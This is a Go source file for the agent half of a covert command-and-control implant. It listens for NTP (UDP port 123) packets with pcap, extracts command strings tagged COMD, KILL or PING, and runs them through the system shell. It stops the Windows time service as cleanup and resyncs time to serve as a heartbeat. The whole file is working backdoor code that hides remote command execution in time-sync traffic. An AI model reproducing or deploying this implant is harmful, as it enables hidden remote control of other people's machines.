package handler

import (
	"bytes"
	_ "context"
	"fmt"
	"log"
	"mesa/goclient/pkg/agent"
	"net"
	"os/exec"
	"strings"

	"github.com/google/gopacket"
	_ "github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func StartSniffer(newAgent agent.Agent) {
	msg := ""
	for {

		var (
			iface  = newAgent.IFace
			buffer = int32(1600)
			filter = "udp and port 123 and dst " + net.IP(newAgent.MyIP).String()
		)

		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
		if err != nil {
			log.Fatal(err)
		}

		defer handler.Close()

		if err := handler.SetBPFFilter(filter); err != nil {
			log.Fatal(err)
		}

		source := gopacket.NewPacketSource(handler, handler.LinkType())
		for packet := range source.Packets() {
			ret, cont := harvestInfo(packet, newAgent)
			if strings.Contains(cont, "COM") {
				msg += ret
			}

			if cont == "COMD" {
				runCommand(msg, newAgent)
				msg = ""
			} else if cont == "KILL" {
				if newAgent.OpSys == "Windows" {
					runCommand("net stop w32time", newAgent)
					runCommand("w32tm /unregister", newAgent)
				} else {
					//runCommand()
					fmt.Println("run kill command fix this") //TODO add linux commands cleanup
				}
				return
			} else if cont == "PING" { //resync
				Heartbeat(newAgent)
			} else {
				continue
			}
		}
	}

}

func harvestInfo(packet gopacket.Packet, newAgent agent.Agent) (string, string) {
	ipLayer := packet.NetworkLayer()
	ipLayerBytes := ipLayer.LayerContents()
	srcIP := ipLayer.LayerContents()[len(ipLayerBytes)-8 : len(ipLayerBytes)-4]
	app := packet.ApplicationLayer()

	if bytes.Compare(srcIP, newAgent.ServerIP) != 0 { //solves DHCP issue
		newAgent.ServerIP = srcIP
		agent.Setup(newAgent)
	}

	if app != nil {
		final := decode(app.LayerContents())
		index := strings.Index(final, "COM")
		if strings.Contains(final, "COMU") {
			return final[index+4:], "COMU"
		} else if strings.Contains(final, "COMD") {
			return final[index+4:], "COMD"
		} else if strings.Contains(final, "KILL") {
			return "", "KILL"
		} else if strings.Contains(final, "PING") {
			return "", "PING" //TODO server auto pings agent if goes to MIA, hoping for change response. also updates NTP server information on box
		}
	}
	return "ignore", "ignore"
}

func runCommand(msg string, newAgent agent.Agent) {
	fmt.Print("Command: ")
	fmt.Println(msg)
	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()

	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("Couldn't execute command")
	}

	fmt.Println(string(output))
}

func decode(content []byte) string {
	/*var newContent []byte

	print(content)
	for i := 0; i < len(content); i++ {
		newContent = append(newContent, content[i]^byte('.')) //XOR single byte decoding
	}
	fmt.Println(newContent)*/
	content = bytes.Trim(content, "\x00")
	return string(content)
	//TODO fix later with single XOR byte
}

func Heartbeat(newAgent agent.Agent) {
	if newAgent.OpSys == "Windows" {
		runCommand("w32tm /resync", newAgent)
	} else {
		runCommand("sntp -s "+net.IP(newAgent.ServerIP).String(), newAgent) //TODO actual linux command
	}
}

//encode and send traffic
/*
func encode(output []byte, handler *pcap.Handle, newAgent agent.Agent) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buf, opts,
		&layers.Ethernet{},
		&layers.IPv4{},
		&layers.TCP{},
		gopacket.Payload([]byte{1, 2, 3, 4}))
	packetData := buf.Bytes()
}*/
